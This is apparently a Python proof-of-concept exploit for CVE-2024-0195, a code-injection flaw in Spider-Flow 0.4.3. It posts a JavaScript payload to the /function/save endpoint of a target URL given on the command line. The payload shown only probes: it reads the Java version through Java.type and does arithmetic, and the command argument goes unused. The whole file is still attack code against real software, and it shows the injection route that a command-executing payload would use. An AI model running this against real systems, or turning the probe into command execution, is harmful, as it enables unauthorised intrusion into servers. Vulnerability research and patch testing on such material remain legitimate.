#!/usr/bin/env python3
"""
Spider-Flow 0.4.3 Remote Code Execution Exploit (CVE-2024-0195)
This exploit demonstrates the code injection vulnerability in the FunctionService.saveFunction method.
"""

import requests
import json
import sys

class SpiderFlowExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.function_save_url = f"{self.target_url}/function/save"

    def create_payload(self, cmd):
        js_payload = """
        function test() {
            try {
                var result = {};

                result.test1 = 2 + 2;

                var d = new Date();
                result.test2 = d.getTime();

                try {
                    var System = Java.type('java.lang.System');
                    result.test3 = System.getProperty('java.version');
                } catch(e) {
                    result.test3_error = e.message;
                }

                var testString = 'CVE-2024-0195';
                result.test4 = testString.split('-').join('_');

                return JSON.stringify(result, null, 2);
            } catch(e) {
                return 'Error: ' + e.message + '\\nStack: ' + e.stack;
            }
        }
        test();
        """
        return js_payload

    def exploit(self):
        try:
            # Prepare the payload
            data = {
                'name': 'test_function',
                'parameter': '',
                'script': self.create_payload('')
            }

            # Send the exploit
            print("[*] Sending exploit to " + self.function_save_url)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/plain, */*'
            }

            response = requests.post(
                self.function_save_url,
                data=data,
                headers=headers
            )

            # Check if the request was successful
            if response.status_code == 200:
                print("[+] Exploit sent successfully")
                print("[*] Server response:")
                print(response.text)

                # Try to parse as JSON if possible
                try:
                    result = response.json()
                    if isinstance(result, str) and "error" in result.lower():
                        print("[-] Server reported error:")
                        print(result)
                except:
                    pass
            else:
                print(f"[-] Failed to send exploit. Status code: {response.status_code}")
                print(response.text)

        except Exception as e:
            print(f"[-] Error during exploitation: {str(e)}")
            raise

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = SpiderFlowExploit(target_url)
    exploit.exploit()

if __name__ == "__main__":
    main()
